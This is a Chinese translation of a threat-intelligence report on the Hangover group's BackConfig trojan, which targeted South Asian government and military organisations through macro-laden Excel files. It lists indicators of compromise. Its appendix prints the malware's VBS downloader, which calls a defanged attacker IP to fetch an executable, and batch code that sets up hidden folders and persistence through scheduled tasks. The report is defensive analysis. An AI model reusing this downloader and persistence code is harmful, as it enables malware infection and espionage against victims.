@@ -1,0 +1,327 @@
+**研究人员在过去4个月中发现，Hangover组织（又名Neon，Viceroy
+Tiger，MONSOON）使用BackConfig恶意软件，通过鱼叉式网络钓鱼攻击南亚的政府和军​​事组织。BackConfig木马具有灵活的插件体系结构，利用组件完成各种功能，包括收集系统和键盘记录信息、上传和执行代码。**
+
+最初感染媒介是Microsoft
+Excel（XLS）文档，文档托管在合法网站，通过电子邮件把网站URL发送到目标邮箱中。文档使用VBA宏代码，如果受害者启用了该代码，会启动木马下载安装程序，下载多个模块完成木马拼装。模块化可使攻击者更快地更改单个组件，可以破坏沙箱和动态分析系统，尤其是在隔离分析组件时可以分割恶意行为。
+
+## 初始分析
+
+在搜索与特定部门和国家/地区有关的AutoFocus数据时，首先发现了Windows
+PE可执行文件（SHA256：84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c）的活动。该文件于2020年1月19日首次出现，下载源为[http://212.114.52]()[.]148/request/httpsrequest，文件以dphc.exe形式存储在本地。恶意软件允许攻击者下载并执行可执行文件，下载并运行批处理文件，在系统上运行命令。样本有自定义的“解密”算法，从每个字符中减去6，解密后得以下字符串：
+
+> linkrequest[.]live
+>
+> \\\Adobe\\\Driver\\\dwg\\\pid.txt
+>
+> \\\Adobe\\\Driver\\\dwg\\\
+>
+> \\\Adobe\\\Driver\\\dwg\\\wuaupdt.exe
+
+木马从文件读取C2 URL，如果文件不存在，则退出不执行任何活动。
+
+> %USERPROFILE%\Adobe\Driver\dwg\pid.txt  
+>
+
+C2通道使用HTTPS，调用HttpOpenRequestA函数时使用了INTERNET_FLAG_SECURE，信标HTTP请求将如下所示：
+
+> GET /orderme/[contents of pid.txt file] HTTP/1.1
+>
+> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101
+> Firefox/52.0 @/NEW
+>
+> Host: linkrequest[.]live [resolving to 23.106.123[.]87]
+
+木马在HTTP响应头中查找以下字段和值：  
+
+> “Content-Type: application”
+>
+> “Content-Type: xDvsds”
+>
+> “Content-Type: Bw11eW”
+
+如果content-type字段包含application值，木马将从HTTP响应头中提取字符串文件名和Content-Transfer-Encoding文件名。使用此文件名在%USERPROFILE%\Adobe\Driver\dwg\ folder中创建文件，在HTTP响应中写入数据。
+
+如果content-type字段值为xDvsds，木马将尝试使用ShellExecuteA和“ open”方法执行以下文件：  
+
+> %USERPROFILE%\Adobe\Driver\dwg\wuaupdt.exe  
+>
+
+如果content-type字段的值为Bw11eW，木马尝试使用ShellExecuteA和“open”方法执行以下文件：
+
+> %USERPROFILE%\Adobe\Driver\dwg\test.bat
+
+## PE元数据  
+
+恶意软件样本包含自签名数字证书，这些可执行文件声称是来自加利福尼亚的Foxit Software Incorporated公司的软件，
+通过定制的文件名和URL的使用使恶意软件更加可信。通过PE元数据，以及基础结构信息，可查找其他BackConfig PE样本。
+下面列出了过去12个月的样本：
+
+![image.png](https://image.3001.net/images/20200516/1589625174_5ebfc1565e4f3.png!small)  
+
+下表显示了来自相同PE文件的版本信息，：  
+
+![image.png](https://image.3001.net/images/20200516/1589625232_5ebfc1909c42b.png!small)  
+
+## 传播和安装
+
+### 第三方基础设施
+
+发现与第三方基础设置有关的URL，这些第三方基础设置可支持BackConfig恶意软件的传播。下表列出了武器化XLS文件与文件名：  
+
+![image.png](https://image.3001.net/images/20200516/1589625420_5ebfc24cd15c5.png!small)
+
+通过对目标和第三方网站分析，网址中使用“fbr”可能与巴基斯坦联邦税务局（fbr）有关。托管文件不依赖php脚本进行传播，页面响应状态301（永久移动）并将URL重定向到所述XLS，启动下载。攻击者使用PHP脚本将访问页面记录到“info.txt”文件中，文件记录了日期时间、客户端操作系统及其IP地址。
+
+样本ed638b5于2017年11月8日被发现了，托管在两个网站上：孟加拉国学校和Maldivan船务代理。  
+
+样本ed638b5的VBA代码直接从下面的URL下载的EXE有效负载（SHA256:4104a871e03f12446ef2f0407177167a9c6679f48d48825cbc1584e4fa792cd）。  
+
+> <http://chancetowin.quezknal>[.]net/appstore/updatepatch/logs.exe  
+>
+
+### 有效载荷演变
+
+下面的时间线图提供了攻击者ttp的演变视图：  
+
+每个XLS都会加载一条虚假的错误消息，如下图示，诱骗受害者以为该文件已损坏。  
+
+![image.png](https://image.3001.net/images/20200516/1589625936_5ebfc450b3cf1.png!small)  
+
+表3中列出的Form.xls（SHA256：be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461）提供了攻击者引诱示例。
+
+打开XLS并启用宏代码后，会显示一份注册表，内容与巴基斯坦政府帮助解决该国住房短缺计划有关。  
+
+![image.png](https://image.3001.net/images/20200516/1589626143_5ebfc51fe86a2.png!small)
+
+AutoFocus和VirusTotal在2019年10月25日处理了XLS文件，发现了nphp_registration_form.php?r= was
+processed，该URL与[http://185.203.119]()[.]184/fin_div/session有关联，IP地址与样本be3f12b有关联，
+PHP网页nphp_registration_form.php的名称与XLS的文件名有关。
+
+XLS文件be3f12b中的VBA宏代码与前几年的样本有所不同。它不直接从VBA代码植入EXE文件或运行Shell命令，而是从Excel工作表中从第27列或“
+AA”开始的隐藏列中检索内容。在AA和AB列中发现先前变体中的批处理代码组件以及新的Visual Basic
+Sc​​ript（VBS）下载器组件，如下图5所示。  
+
+![image.png](https://image.3001.net/images/20200516/1589626681_5ebfc739208bf.png!small)2019年11月15日发现新的武器化XLS文件（SHA256：021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b）。VBA宏代码包含有1,062字节大小的十进制编码的ZIP文件。ZIP文件内有两个文本文件，这些文件会被解压缩到文件夹driverkit中。  
+
+Invoice.xls（SHA256：8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c;首次发现日期：2020-01-15）。感染过程由多个组件组成。
+一旦VBA将其写入磁盘并执行，“setup”批处理（BAT）文件和BackConfig插件会对目标进行感染。
+
+![image.png](https://image.3001.net/images/20200516/1589627035_5ebfc89b14aab.png!small)
+
+>
+> 1、创建文本文件Drive.txt（SHA-256：4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1），其中包含十进制解码的VBS。
+>
+> 2、VBA代码将批处理写入 Audio.txt。
+>
+> 3、Audio.txt重命名为Audio.bat并执行。
+>
+> 4、Audio.bat会清理与先前感染相关的所有文件和文件夹，并重新创建所需的环境（包括创建上述pid.txt）。
+>
+> 5、Audio.bat创建两个计划的任务引用两个文件：dphc.exe将每10分钟运行一次，Drive.vbs每20分钟运行一次。
+>
+>
+> 6、在删除自身之前，Audio.bat会将Drive.txt重命名为Drive.vbs。执行Drive.vbs时，它将下载BackConfig可执行文件有效负载。
+>
+> 7、执行dphc.exe时，它首先检查pid.txt是否存在（步骤4），仅在文件存在的情况下继续运行。
+
+最终，XLS将两个文件写入磁盘，BAT修改系统设置并创建两个计划任务。20分钟后计划任务执行VBS下载器组件并启动BackConfig loader
+EXE。  
+
+## 总结
+
+Hangover组织保持活跃状态并具有针对性，针对南亚政府和军​​事组织使用鱼叉式钓鱼电子邮件攻击，诱使受害者浏览网站并下载含有BackConfig
+Trojan的Excel文档，从BackConfig的样本中发现其执行命令和部署方式等。恶意软件模块化可使攻击者轻松地更新和重用代码，该组织将重点放在逃避沙箱和其他自动化系统检测。
+
+## ATT&CK  
+
+##
+![image.png](https://image.3001.net/images/20200516/1589627375_5ebfc9efd960d.png!small)IOCs
+
+### Delivery Documents
+
+> 56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6
+>
+> 8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c
+>
+> 021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b
+>
+> be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461
+>
+> 0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf
+>
+> ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb
+>
+> 752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using
+> CVE-2017-11882)
+
+### Batch Files
+
+> 4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt
+> / .bat from Naya Housing campaign)
+>
+> C94f7733fc9bdbc***3efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9
+>
+> 6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3
+>
+> 750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580
+>
+> 5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295
+>
+> f64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e
+>
+> 98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e
+>
+> 29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096
+> (driverkit.bat)
+>
+> abe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003
+> (Winmgt_Drive.bat uses bitsadmin)
+>
+> 02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c
+
+### VBS files
+
+> 87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1
+> (One_drivers.txt / .vbs from Naya Housing campaign)
+>
+> 952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a
+> (Down_LinkLog.vbs)
+>
+> a1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs
+> using BITS)
+
+### EXE Payloads
+
+> 306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644
+>
+> 0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92
+>
+> 84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c
+>
+> 18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9
+>
+> 922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709
+>
+> 4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5
+>
+> 677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2
+>
+> d3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f
+>
+> 91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1
+>
+> de5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a
+>
+> f79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b
+>
+> 9e141fe67521b75412419a8c88c199c8ebd2a135c7a8***edced454fbc33cb77
+>
+> 6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e
+>
+> e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f
+>
+> 07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda
+>
+> 31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848
+>
+> 15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892
+>
+> D87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861
+>
+> 167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e
+>
+> 4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of
+> older set of downloaders)
+>
+> b18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5
+> (driverkit.zip)
+
+### Infrastructure
+
+> linkrequest[.]live (23.106.123[.]87)
+>
+> matissues[.]com
+>
+> unique.fontsupdate[.]com
+>
+> 185.203.119[.]184
+>
+> 212.114.52[.]148
+
+## 附录
+
+### Drive.txt -> Drive.vbs CODE
+
+    
+    
+    strFileURL = "http://<strong>185.203.119[.]184/Dropbox/request"</strong> 
+    Set oShell = CreateObject("WScript.Shell") 
+         strHomeFolder = 
+    oShell.ExpandEnvironmentStrings("%USERPROFILE%") 
+         strPath = "<strong>C:\Drivers\dphc.exe"</strong> 
+    On Error Resume Next 
+    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") 
+        objXMLHTTP.open "GET", strFileURL, false 
+        objXMLHTTP.send() 
+    If objXMLHTTP.Status = 200 Then 
+    Set objADOStream = CreateObject("ADODB.Stream") 
+    objADOStream.Open 
+    objADOStream.Type = 1  
+    objADOStream.Write objXMLHTTP.ResponseBody 
+    objADOStream.Position = 0     
+    Set objFSO = CreateObject("Scripting.FileSystemObject") 
+    If objFSO.Fileexists(strPath) Then WScript.Quit() 
+    Set objFSO = Nothing 
+    objADOStream.SaveToFile strPath 
+    objADOStream.Close 
+    Set objADOStream = Nothing 
+    End if 
+    Set objXMLHTTP = Nothing    
+    
+
+### Audio.txt -> Audio.bat CODE  
+
+    
+    
+    Set oFile = fso.CreateTextFile("c:\Drivers\Audio.txt")
+    oFile.WriteLine ("echo off")
+    oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\pdf")
+    oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\dwg")
+    oFile.WriteLine ("md %USERPROFILE%\Daily\Backup\Files")
+    oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Adobe")
+    oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Daily")
+    oFile.WriteLine ("attrib +a +h +s C:\Drivers")
+    oFile.WriteLine ("del /f 
+    %USERPROFILE%\Adobe\Driver\pdf\pid.txt")
+    oFile.WriteLine ("del /f 
+    %USERPROFILE%\Adobe\Driver\dwg\pid.txt"
+    oFile.WriteLine ("SET /A %COMPUTERNAME%")
+    oFile.WriteLine ("SET /A RAND=%RANDOM% 10000 + 1")
+    oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% >> 
+    %USERPROFILE%\Adobe\Driver\pdf\pid.txt")
+    oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% >> 
+    <strong>%USERPROFILE%\Adobe\Driver\dwg\pid.txt")</strong>
+    oFile.WriteLine ("schtasks /delete /tn Winmgt_log /f")
+    oFile.WriteLine ("schtasks /delete /tn Yahoo_Drive /f")
+    oFile.WriteLine ("schtasks /create /sc minute /mo 10 /f /tn 
+    Winmgt_log /tr C:\Drivers\dphc.exe")
+    oFile.WriteLine ("schtasks /create /sc minute /mo 20 /f /tn 
+    Yahoo_Drive /tr C:\Drivers\Drive.vbs")
+    oFile.WriteLine ("ren C:\Drivers\Drive.txt Drive.vbs ")
+    oFile.WriteLine ("del %0")
+    oFile.Close
+    Set fso = Nothing
+    Set oFile = Nothing
+    
+        Dim OldName, NewName
+        GivenLocation = "C:\Drivers\"
+        OldName = "Audio.txt"
+        <strong>NewName = "Audio.bat"</strong>
+        On Error Resume Next
+        Name GivenLocation & OldName As GivenLocation & NewName
+        Dim RetVal
+        RetVal = Shell("C:\Drivers\Audio.bat", vbHide)  
+    
+
+ ***参考来源：[paloaltonetworks](https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/)，由Kriston编译，转载请注明来自FreeBuf.COM**  
+
